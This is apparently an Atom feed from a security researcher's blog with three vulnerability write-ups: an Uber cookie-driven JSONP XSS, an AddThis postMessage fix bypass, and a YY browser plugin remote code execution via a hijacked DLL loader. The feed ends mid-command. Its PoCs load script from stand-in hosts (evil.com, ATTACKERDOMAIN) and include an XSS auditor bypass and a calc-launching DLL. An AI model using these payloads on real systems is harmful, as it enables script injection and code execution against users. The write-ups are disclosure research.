<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhchbin</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhchbin.github.io/"/>
  <updated>2017-09-09T14:22:27.000Z</updated>
  <id>http://zhchbin.github.io/</id>
  
  <author>
    <name>Chaobin Zhang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[BBP系列二] Uber XSS via Cookie</title>
    <link href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/"/>
    <id>http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/</id>
    <published>2017-08-30T11:36:20.000Z</published>
    <updated>2017-09-09T14:22:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p><h2 id="JSONP-Request"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</h2><p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="keyword">this</span>.log(<span class="string">"making idr call"</span>),</span><br><span class="line">    a = <span class="keyword">this</span>.rfiServer ? <span class="keyword">this</span>.rfiServer : <span class="string">"a.rfihub.com"</span>,</span><br><span class="line">    b = <span class="keyword">this</span>.getProtocol() + <span class="string">"//"</span> + a + <span class="string">"/idr.js"</span>,</span><br><span class="line">    <span class="keyword">this</span>.jsonpGet(b, &#123;&#125;, <span class="keyword">this</span>.idrCallback, <span class="string">"cmZpSWRJbkNhY2hl"</span>),</span><br><span class="line">    <span class="keyword">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg" alt=""></p><p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="noopener">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p><p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg" alt=""></p><p>After reading through these lines of code:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">this</span>.readCookie(<span class="string">"_rfiServer"</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="keyword">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure><p>We could get the information that the initial value of <code>this.rfiServer</code> was set by using value of cookie <code>_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p><ul><li>HTTP Header CRLF Injection at any subdomain of uber.com</li><li>XSS at any subdomain of uber.com</li></ul><p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p><h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &apos;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/&apos;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p><h2 id="XSS-of-uber-com-which-is-Out-of-Scope"><a href="#XSS-of-uber-com-which-is-Out-of-Scope" class="headerlink" title="XSS of .uber.com which is Out of Scope"></a>XSS of <redacted>.uber.com which is Out of Scope</redacted></h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p><p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p><ol><li><code>&quot;</code> is reflected and not encoded. We can inject any attribution into <code>input</code> tag.</li><li><code>type=&quot;text&quot;</code> is after the injection point. So we can inject <code>type=&quot;image&quot; src=&quot;1&quot; onerror=&quot;alert(1)&quot;</code>. Note that when there is two types, the second one will be ignored.</li><li><code>&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code>o&gt;nerror</code>.</li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol><li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li><li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li><li><p>The final PoC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span></span><br><span class="line">email=aaa<span class="string">"%20type%3d"</span>image<span class="string">"%20src%3d1%20o&gt;nerror%3d"</span><span class="built_in">eval</span>(<span class="built_in">decodeURIComponent</span>(location.hash.substr(<span class="number">1</span>)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure></li><li><p>Thanks for Uber. Reward: 5k</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to expl
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
      <category term="BBP" scheme="http://zhchbin.github.io/tags/BBP/"/>
    
  </entry>
  
  <entry>
    <title>分享插件AddThis导致的DOM XSS</title>
    <link href="http://zhchbin.github.io/2016/12/25/DOM-XSS-Caused-by-AddThis/"/>
    <id>http://zhchbin.github.io/2016/12/25/DOM-XSS-Caused-by-AddThis/</id>
    <published>2016-12-25T06:03:41.000Z</published>
    <updated>2017-08-30T15:14:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="noopener">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p><blockquote><p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p></blockquote><p>使用的例子有：</p><p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当插件加载完成后，就会监听<code>message</code>事件。</p><p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p><p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"frame"</span> <span class="attr">src</span>=<span class="string">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>AddThis对这个漏洞进行的修复如下：</p><ol><li>添加检查当前窗口是不是被嵌套在：<code>iframe</code>, <code>frame</code>等标签里，如果是，则不监听<code>message</code>事件。</li><li>检查来源</li></ol><p>修复后的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">, c = <span class="built_in">window</span>.parent === <span class="built_in">window</span>;</span><br><span class="line">...</span><br><span class="line">c &amp;&amp; u(<span class="built_in">window</span>, <span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">      <span class="keyword">var</span> t = _atr.substring(<span class="number">0</span>, _atr.length - <span class="number">1</span>)</span><br><span class="line">        , n = e.origin.indexOf(t) === <span class="string">"https:"</span>.length || e.origin.indexOf(t) === <span class="string">"http:"</span>.length || <span class="regexp">/^https?:\/\/(localhost:\d+|localhost$)/</span>.test(e.origin)</span><br><span class="line">        , o = <span class="string">"string"</span> == <span class="keyword">typeof</span> e.data;</span><br><span class="line">      <span class="keyword">if</span> (o &amp;&amp; n) &#123;</span><br><span class="line">          <span class="keyword">var</span> a = e.data.match(<span class="regexp">/at\-share\-bookmarklet\:(.+?)$/</span>) || []</span><br><span class="line">            , i = a[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> (i) &#123;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  _ate.menu.close()</span><br><span class="line">              &#125; <span class="keyword">catch</span> (s) &#123;&#125;</span><br><span class="line">              r(i)</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol><li>其中<code>_attr</code>的值为<code>//s7.addthis.com/</code>，那么<code>t</code>的值就是<code>//s7.addthis.com</code></li><li><code>e.origin</code>是调用了<code>postMessage</code>这个API的来源</li><li>什么时候<code>o &amp;&amp; n</code>的值会是真呢？例如站点：<code>http://s7.addthis.com/</code>向目标站点发送消息的时候</li></ol><p>但这个修复真的没有问题了吗？在使用postMessage进行跨域通信的时候，有以下几种场景：</p><ol><li>父窗口与iframe，frame等标签里的子网页进行通信，即上面那个PoC</li><li><p>使用window.open打开一个新的窗口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="built_in">window</span>.open(<span class="string">"http://target.com/index.html"</span>);</span><br><span class="line">win.postMessage(<span class="string">"this is a message"</span>, <span class="string">"*"</span>);</span><br></pre></td></tr></table></figure><p><code>http://target.com/index.html</code>这个页面就可以监听<code>message</code>事件获取到以上的消息。</p></li></ol><p>也就是说，对于一个安装了这个插件的目标站点，我们依旧可以通过方法2发送一个消息给他。另外，这里的域名检查也不完善，简单的说，只要是<code>s7.addthis.com</code>开头的域名都是合法的，如<code>s7.addthis.com.evil.com</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; e.origin = <span class="string">'http://s7.addthis.com.evil.com'</span></span><br><span class="line">&gt; e.origin.indexOf(t) === <span class="string">"http:"</span>.length</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;说明：这个漏洞是 &lt;a href=&quot;https://labs.detectify.com/2016/12/15/postmessage-xs
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>[浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行</title>
    <link href="http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/"/>
    <id>http://zhchbin.github.io/2016/10/15/YY-Browser-RCE/</id>
    <published>2016-10-15T08:58:50.000Z</published>
    <updated>2016-10-15T09:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0221080" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2016-0221080</a></p><p>这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://udblogin.duowan.com/login.do?online&amp;report_ver=new&amp;showtools=0&amp;webyygame&amp;pro=webyygame&amp;rso=FROM_SCTG&amp;rso_desc=%E5%B8%82%E5%9C%BA%E6%8E%A8%E5%B9%BF&amp;ref=gw/entergame&amp;ref_desc=%E5%AE%98%E7%BD%91%2f%E8%BF%9B%E5%85%A5%E6%B8%B8%E6%88%8F&amp;game=JZWL&amp;server=s6</span><br></pre></td></tr></table></figure><p>点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。<br><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg" alt=""></p><p>发现页面中有这样的一段代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"flash"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"fancy3d"</span> <span class="attr">type</span>=<span class="string">"application/fancy-npruntime-fancy3d-plugin"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"198"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"game"</span> <span class="attr">value</span>=<span class="string">"jzwl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"nprver"</span> <span class="attr">value</span>=<span class="string">"0.0.2.17"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"ocxver"</span> <span class="attr">value</span>=<span class="string">"0.0.2.17"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"liburl"</span> <span class="attr">value</span>=<span class="string">"http://loader.52xiyou.zsgl.ate.cn/jzwl/loader/loaderUpdater.71f24efc47252dee7ca07eb571bd6f50.dll"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"libmd5"</span> <span class="attr">value</span>=<span class="string">"71f24efc47252dee7ca07eb571bd6f50"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"unsafelib"</span> <span class="attr">value</span>=<span class="string">"allow"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param1"</span> <span class="attr">value</span>=<span class="string">"cmdline=uid:1576442523|skey:6|platform:duowan|sign:7115344fa13ccca8950cfea0484437ce|type:web"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param2"</span> <span class="attr">value</span>=<span class="string">"client_root_url=http://res.jzwl.52xiyou.com/client/"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param3"</span> <span class="attr">value</span>=<span class="string">"ip_port=[121.46.21.176,121.46.21.176,121.46.21.176,121.46.21.176]|[8092]"</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param5"</span> <span class="attr">value</span>=<span class="string">"loader_root_url=http://res.jzwl.52xiyou.com/loader/"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param6"</span> <span class="attr">value</span>=<span class="string">"loader_ver_name=loader.ver"</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param7"</span> <span class="attr">value</span>=<span class="string">"loader_catalog_name=loader_catalog.txt"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"param8"</span> <span class="attr">value</span>=<span class="string">"loader_name=loaderjz.dll"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我擦！这个好像在哪里见过的：<a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0172781</a> 我们开始分析吧！</p><h2 id="0x00-这个插件是哪里来的？"><a href="#0x00-这个插件是哪里来的？" class="headerlink" title="0x00 这个插件是哪里来的？"></a>0x00 这个插件是哪里来的？</h2><p>YY浏览器启动的时候会检查注册表中是否已经安装有Fancy3D游戏引擎这个NPAPI插件，具体路径如下。如果不存在，则会自动静悄悄地帮用户安装上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\MozillaPlugins\@fancyguo.com/FancyGame,version=1.0.0.1</span><br></pre></td></tr></table></figure><p><img src="http://ww2.sinaimg.cn/large/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg" alt=""></p><h2 id="0x01-插件功能分析"><a href="#0x01-插件功能分析" class="headerlink" title="0x01 插件功能分析"></a>0x01 插件功能分析</h2><p><code>libcurl</code>和<code>libcmd5</code>这两个参数在 <a href="http://wooyun.org/bugs/wooyun-2016-0172781" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2016-0172781</a> 已经分析过，这里更简单，连域名白名单限制都没有做，直接修改成为自己的域名都会请求，一开始我以为是可以直接搞定的。但实验过后发现，自己写的dll按照规则放进去之后并没有加载到进程中。进一步查看信息，发现360浏览器那个洞里出现的游戏提供方好像是同一家公司，看样子是做了数字签名，没什么好方法，先放一边。</p><p>里面还有几个参数，看上去也是会下载文件，把<code>&lt;param name=&quot;param5&quot; value=&quot;loader_root_url=http://a.com/loader/&quot;&gt;</code>改成自己本地的地址（注：我在Hosts文件里做了<code>127.0.0.1 a.com</code>映射）看看它都会请求下载哪些东西。测试过后，发现过程如下：</p><ol><li>下载loader_root_url + loader_ver_name，即这个文件：<a href="http://res.jzwl.52xiyou.com/loader/loader.ver" target="_blank" rel="noopener">http://res.jzwl.52xiyou.com/loader/loader.ver</a> ，其内容为<code>2016-06-02</code></li><li><p>下载loader_root_url + 2016-06-02/loader_catalog.txt，即：<a href="http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt" target="_blank" rel="noopener">http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt</a> ， 其内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl.exe.lzma||3b0c063789066f74667efc13db00e9cc||247772||f4edf7cab0d6a404b77eb816c996831c||506048</span><br><span class="line">jztr.exe.lzma||c5dbe14ad37375371cb79261b848bcc8||69086||339068e9b3286cb30e100c398ea632f1||154816</span><br><span class="line">flash.ocx.lzma||b2a9e2cdb422b3a71558ad9b6acc4ec8||1701337||8afc17155ed5ab60b7c52d7f553d579c||3866528</span><br><span class="line">loading.swf.lzma||a77c04de83da48dcbb6b15c9028829a7||961202||5f52ea04bc871804c0c059a82053894c||950321</span><br><span class="line">loaderjz.dll.lzma||4a51f304098ccebcecdf238ff3736d60||350535||2f22bb87e00681d858e3bd6013843231||804496</span><br></pre></td></tr></table></figure></li><li><p>下载上面的文件，并执行加载游戏的一些操作。通过procexp.exe查看相应YY浏览器的NPAPI的进程，发现其动态加载的dll中，果然有<code>loaderjz.dll</code>这个文件。</p><p> 目录结构如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">│───poc.html</span><br><span class="line">│</span><br><span class="line">└───loader</span><br><span class="line">    │   loader.ver</span><br><span class="line">    └───2016-06-02</span><br><span class="line">            curl.exe.lzma</span><br><span class="line">            flash.ocx.lzma</span><br><span class="line">            jztr.exe.lzma</span><br><span class="line">            loaderjz.dll.lzma</span><br><span class="line">            loader_catalog.txt</span><br><span class="line">            loading.swf.lzma</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02-分析文件格式"><a href="#0x02-分析文件格式" class="headerlink" title="0x02 分析文件格式"></a>0x02 分析文件格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk curl.exe.lzma</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">42            0x2A            LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 506048 bytes</span><br></pre></td></tr></table></figure><p>观察每个文件，发现它们都有一个不定长的头部信息，然后是<code>LZMA:24</code>算法压缩的数据包，Google之后猜测是使用这里的工具开发的：<a href="http://www.7-zip.org/sdk.html" target="_blank" rel="noopener">http://www.7-zip.org/sdk.html</a></p><p>接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。<br><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f4xie83ou5j20hp030jt7.jpg" alt=""></p><ul><li>00 - 03 字节：29 00 00 00 = 0x29 = 41，正好是上面binwalk分析出来的头部长度。</li><li>04 - 07 字节：B3 C7 03 00 = 0x03C7B3 = 247731，是loader_catalog.txt文件中 247772 - 41 得到的，而247772是curl.exe.lzma文件的大小。最终，通过<code>binwalk -e</code>解压开文件，发现就是加了头部信息之前的文件的大小 + 1</li><li>08 - 11 字节：C0 B8 07 00 = 0x07B8C0 = 506048，应该就是解压后文件的大小</li><li>12 - 13 字节：09 00 = 9，刚好就是字符串<code>curl.exe</code>的长度，注意结尾的<code>\0</code></li><li>14 - 15 字节：11 00，暂时没猜到</li><li>16 - 31 字节：00000000000000000000000000000000</li><li>32 - 40 字节：6375726C2E65786500 = <code>curl.exe</code></li></ul><h2 id="0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行"><a href="#0x03-劫持loaderjz-dll-lzma这个文件实现远程命令执行" class="headerlink" title="0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行"></a>0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行</h2><p>首先，自己实现一个dll文件，在其<code>DllMain</code>入口函数的时候中启动一下计算器就好，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">WinExec(<span class="string">"calc"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成Release版本，改名，使用 <a href="http://www.7-zip.org/sdk.html" target="_blank" rel="noopener">http://www.7-zip.org/sdk.html</a> 这里下载得到的lzma.exe压缩一下文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\lzma\bin&gt;lzma.exe e loaderjz.dll loaderjz.dll.lzma -d24</span><br><span class="line"></span><br><span class="line">LZMA 16.02 : Igor Pavlov : Public domain : 2016-05-21</span><br><span class="line"></span><br><span class="line">Input size:  12288 (0 MiB)</span><br><span class="line">Output size: 5748 (0 MiB)</span><br></pre></td></tr></table></figure></p><p>接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python gen.py loaderjz.dll</span><br><span 